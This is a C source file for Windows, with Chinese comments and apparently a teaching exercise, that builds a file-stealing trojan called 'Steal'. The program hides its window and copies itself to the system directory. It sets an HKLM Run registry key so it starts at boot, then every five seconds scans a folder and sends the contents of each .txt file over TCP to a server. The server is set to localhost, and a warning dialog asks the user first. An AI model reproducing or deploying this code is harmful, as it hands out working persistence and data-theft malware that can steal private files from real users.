#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h> 
#include <windows.h> 
#include <io.h> 

#pragma comment(lib, "ws2_32.lib") 

int SendtoServer(const char* path) 
{
	//0 初始化网络库 
	// 加载套接字库 
	WORD wVersionRequested; 
	WSADATA wsaData; 
	int err; 
	char sendBuf[1024] = {0}; 
	wVersionRequested = MAKEWORD(2, 2);
	// 1、初始化套接字库 
	err = WSAStartup(wVersionRequested, &wsaData);
	if (err != 0) 
	{ 
		printf("WSAStartup errorNum = %d\n", GetLastError());
		system("pause"); 
		return err; 
	}
	if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2)
	{ 
		printf("LOBYTE errorNum = %d\n", GetLastError()); 
		WSACleanup();
		system("pause"); 
		return -1; 
	}
	// 2 安装电话机 
	// 新建套接字 
	SOCKET sockCli = socket(AF_INET, SOCK_STREAM, 0);
	if (INVALID_SOCKET == sockCli) 
	{
		printf("socket errorNum = %d\n", GetLastError());
		system("pause");
		return -1;
	}
	SOCKADDR_IN addrSrv; 
	addrSrv.sin_addr.S_un.S_addr = inet_addr("127.0.0.1"); 
	addrSrv.sin_family = AF_INET;
	addrSrv.sin_port = htons(6000); 
	// 3 连接服务器 
	if (SOCKET_ERROR == connect(sockCli, (SOCKADDR*)&addrSrv, sizeof(SOCKADDR)))
	{ 
		printf("connect errorNum = %d\n", GetLastError());
		system("pause");
		return -1;
	}
	// 4 读取文件内容
	FILE* fp = fopen(path, "rb"); 
	int len = fread(sendBuf, 1, 1024, fp);
	fclose(fp);
	// 5 发送数据 
	int iLen = send(sockCli, sendBuf, strlen(sendBuf) + 1, 0); 
	if (iLen < 0) 
	{
		printf("send errorNum = %d\n", GetLastError());
		system("pause"); 
		return -1; 
	}
	// 关闭套接字 
	closesocket(sockCli); //
	WSACleanup(); 
	return 0;
}

int DoSteal(const char *szPath) 
{ 
	// 1 遍历 szPath 下所有的文件 
	WIN32_FIND_DATA FindFileData;// FindFileData 表示文件 
	HANDLE hListFile; //文件用句柄来标识，编号 
	char szFilePath[MAX_PATH] = {0}; 
	strcpy(szFilePath, szPath);
	strcat(szFilePath, "\\*"); 
	// 2 首先找到第一个文件,用 hListFile 标识 
	hListFile = FindFirstFile(szFilePath, &FindFileData); 
	// 3 循环遍历所有文件 
	do
	{ 
		char mypath[MAX_PATH] = { 0 }; 
		strcpy(mypath, szPath);
		strcat(mypath, FindFileData.cFileName);
		if (strstr(mypath, ".txt")) //txt 文件 
		{ 
			//真真正正开始窃取文件 
			SendtoServer(mypath);
			printf("mypath = %s\n", mypath);
		}
	} while (FindNextFile(hListFile, &FindFileData)); //FindNextFile 的返回值为 NULL，退出循环 
	return 0;
}

void AddToSystem()
{
	HKEY hKEY; 
	char CurrentPath[MAX_PATH];
	char SysPath[MAX_PATH];
	long ret = 0; 
	LPSTR FileNewName; 
	LPSTR FileCurrentName; 
	DWORD type = REG_SZ;
	DWORD size = MAX_PATH;
	LPCTSTR Rgspath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"; //regedit win + R 
	GetSystemDirectory(SysPath, size);
	GetModuleFileName(NULL, CurrentPath, size); //Copy File 
	FileCurrentName = CurrentPath; FileNewName = lstrcat(SysPath, "\\Steal.exe");
	struct _finddata_t Steal;
	printf("ret1 = %d,FileNewName = %s\n", ret, FileNewName);
	if (_findfirst(FileNewName, &Steal) != -1) 
		return;//已经安装！ 
	printf("ret2 = %d\n", ret); 
	int ihow = MessageBox(0, "该程序只允许用于合法的用途！\n 继续运行该程序将使这台机器 处于被监控的状态！\n 如果您不想这样，请按“取消”按钮退出。\n 按下“是”按钮该程序将被复制 到您的机器上，并随系统启动自动运行。\n 按下“否”按钮，程序只运行一次，不会在您的系统内留下 任何东西。", "警告", MB_YESNOCANCEL | MB_ICONWARNING | MB_TOPMOST);
	if (ihow == IDCANCEL) 
		exit(0); 
	if (ihow == IDNO)
		return;//只运行一次
	//复制文件 
	ret = CopyFile(FileCurrentName, FileNewName, TRUE);
	if (!ret) 
	{ 
		return;
	}//加入注册表 
	printf("ret = %d\n", ret);
	ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, Rgspath, 0, KEY_WRITE, &hKEY);
	if (ret != ERROR_SUCCESS) 
	{ 
		RegCloseKey(hKEY); 
		return;
	}//Set Key
	ret = RegSetValueEx(hKEY, "Steal", NULL, type, (const unsigned char*)FileNewName, size);
	if (ret != ERROR_SUCCESS)
	{ 
		RegCloseKey(hKEY);
		return; 
	}
	RegCloseKey(hKEY); 
}

void HideMyself() // 隐藏窗口
{ 
	// 拿到当前的窗口句柄
	HWND hwnd = GetForegroundWindow();
	ShowWindow(hwnd, SW_HIDE);
}

int main() 
{ 
	printf("Steal\n"); 
	//隐藏自身 
	HideMyself(); 
	// 添加到启动项 
	AddToSystem(); 
	//窃取文件 窃取哪个文件呢？？ 
	while (1) 
	{ 
		DoSteal("C:\\Users\\20613\\Desktop\\test\\"); //这里需要传入的是一个文件夹的路径,并且最后面必须是"\\"
		Sleep(5000);
	}
	system("pause"); 
	return 0; 
}